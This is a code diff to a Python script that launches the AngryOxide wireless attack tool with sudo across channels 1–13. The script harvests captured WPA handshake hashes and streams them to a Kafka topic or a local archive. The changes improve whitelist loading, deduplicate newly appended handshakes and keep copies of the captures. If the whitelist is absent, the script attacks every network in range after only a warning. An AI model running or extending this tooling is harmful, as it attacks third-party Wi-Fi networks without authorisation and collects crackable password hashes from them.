@@ -6,6 +6,7 @@ import pandas as pd
 import re
 import os
 import json
+import shutil
 import argparse
 from kafka import KafkaProducer
 
@@ -16,6 +17,8 @@ from kafka import KafkaProducer
 sysId = 'Attack1'
 MODULE_INTERVAL = 5  # Interval in seconds to run attack modules
 KAFKA_BROKER = 'localhost:9092'  # Default Kafka broker
+WHITELIST_FILE = 'whitelist.txt'  # Passed to AngryOxide with --whitelist
+ARCHIVE_DIR = 'hashes'  # Where local mode keeps a copy of each hash file
 
 DESC_MESSAGE = \
   r">>============================================<<" + "\n"\
@@ -231,6 +234,15 @@ def split_dataframe_on_marker(df, marker='Station MAC', col_index=None):
 
     return top_df, bottom_df
 
+def parse_hash_filename(hc_file):
+    """Extract (essid, bssid) from an AngryOxide hash filename: essid_BSSID.hc22000"""
+    name_without_ext = hc_file[:-len('.hc22000')]
+    # Split on the last underscore; sanitized ESSIDs may contain underscores.
+    parts = name_without_ext.rsplit('_', 1)
+    if len(parts) == 2:
+        return parts[0], parts[1]
+    return name_without_ext, 'unknown'
+
 def publish_to_kafka(topic, message, broker='localhost:9092'):
     """Publish a message to a Kafka topic and print to terminal."""
     try:
@@ -262,31 +274,39 @@ def main(interval, broker, use_local, use_kafka, auto_config):
         print("[!] Failed to enable monitor mode. Exiting.")
         sys.exit(1)
 
-    # Create hashes folder if using local output
+    # AngryOxide always writes .hc22000 files into the working directory, so that
+    # is where we poll. Local mode keeps an archived copy in the hashes folder.
     hash_dir = '.'
+    archive_dir = None
     if use_local:
-        os.makedirs('hashes', exist_ok=True)
-        hash_dir = 'hashes'
-        print("[+] Created/using 'hashes' folder for local output")
+        os.makedirs(ARCHIVE_DIR, exist_ok=True)
+        archive_dir = ARCHIVE_DIR
+        print(f"[+] Created/using '{archive_dir}' folder for local output")
 
     print("[*] Starting attack modules...")
     # Start AngryOxide subprocess
     print(f"[*] Starting AngryOxide on {selected_interface}...")
-    angryoxide_cmd = ['sudo', 'angryoxide', '-i', selected_interface, '-c', '1,2,3,4,5,6,7,8,10,11,12,13', '-w', 'whitelist.txt', '-r', '3', '--headless', '--notar']
-    if use_local:
-        angryoxide_cmd.extend(['-o', hash_dir])
+    angryoxide_cmd = ['sudo', 'angryoxide', '-i', selected_interface, '-c', '1,2,3,4,5,6,7,8,10,11,12,13', '-r', '3', '--headless', '--notar']
+    # --whitelist loads a file; the -w short flag takes a single MAC/SSID instead.
+    if os.path.isfile(WHITELIST_FILE):
+        angryoxide_cmd.extend(['--whitelist', WHITELIST_FILE])
+        print(f"[+] Loading whitelist from '{WHITELIST_FILE}'")
+    else:
+        print(f"[!] Whitelist file '{WHITELIST_FILE}' not found - nothing will be excluded from attacks.")
     angryoxide = subprocess.Popen(angryoxide_cmd,
                                   stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     print(f"[*] Started AngryOxide with PID {angryoxide.pid}")
     print(f"[*] Scan interval: {interval} seconds")
+    print(f"[*] Watching for .hc22000 files in '{os.path.abspath(hash_dir)}'")
     if use_local:
-        print(f"[*] Output mode: Local files in '{hash_dir}' folder")
+        print(f"[*] Output mode: Local files archived to '{archive_dir}' folder")
     if use_kafka:
         print(f"[*] Kafka broker: {broker}")
     if use_local and use_kafka:
         print("[*] Hash files will be saved locally AND published to Kafka")
 
-    processed_files = set()
+    seen_files = set()
+    processed_hashes = set()
 
     # Main loop
     while True:
@@ -297,40 +317,40 @@ def main(interval, broker, use_local, use_kafka, auto_config):
             hc_files = [f for f in os.listdir(hash_dir) if f.endswith('.hc22000')]
 
             for hc_file in hc_files:
-                if hc_file not in processed_files:
+                if hc_file not in seen_files:
                     print(f"[*] Found new hash file: {hc_file}")
-                    try:
-                        # Extract essid and bssid from filename
-                        # Format: essid_BSSID.hc22000
-                        # Remove .hc22000 extension and BSSID (8 chars including underscore)
-                        name_without_ext = hc_file[:-8]
-                        # Split on last underscore to separate essid and bssid
-                        parts = name_without_ext.rsplit('_', 1)
-                        if len(parts) == 2:
-                            essid = parts[0]
-                            bssid = parts[1]
-                        else:
-                            essid = name_without_ext
-                            bssid = 'unknown'
+                    seen_files.add(hc_file)
+                try:
+                    essid, bssid = parse_hash_filename(hc_file)
 
-                        file_path = os.path.join(hash_dir, hc_file)
-                        with open(file_path, 'r') as f:
-                            for line in f:
-                                line = line.strip()
-                                if line:
-                                    message = {
-                                        'sysId': sysId,
-                                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
-                                        'essid': essid,
-                                        'bssid': bssid,
-                                        'hash': line
-                                    }
-                                    print(f"[+] Read hash from {essid} ({bssid}): {line}")
-                                    if use_kafka:
-                                        publish_to_kafka('wifi-hash', message, broker=broker)
-                        processed_files.add(hc_file)
-                    except Exception as e:
-                        print(f"[!] Error reading {hc_file}: {e}")
+                    # Re-read each file every pass; AngryOxide appends new
+                    # handshakes to an existing file as it collects them.
+                    file_path = os.path.join(hash_dir, hc_file)
+                    new_hashes = 0
+                    with open(file_path, 'r') as f:
+                        for line in f:
+                            line = line.strip()
+                            if not line or line in processed_hashes:
+                                continue
+                            processed_hashes.add(line)
+                            new_hashes += 1
+                            message = {
+                                'sysId': sysId,
+                                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
+                                'essid': essid,
+                                'bssid': bssid,
+                                'hash': line
+                            }
+                            print(f"[+] Read hash from {essid} ({bssid}): {line}")
+                            if use_kafka:
+                                publish_to_kafka('wifi-hash', message, broker=broker)
+
+                    # Archive locally so captures survive the next cleanup.sh run
+                    if new_hashes and archive_dir:
+                        shutil.copy2(file_path, os.path.join(archive_dir, hc_file))
+                        print(f"[+] Saved {hc_file} to '{archive_dir}/' ({new_hashes} new hashline(s))")
+                except Exception as e:
+                    print(f"[!] Error reading {hc_file}: {e}")
 
         except KeyboardInterrupt:
             print("\n[!] SIGINT detected (Ctrl-C), shutting down gracefully...")
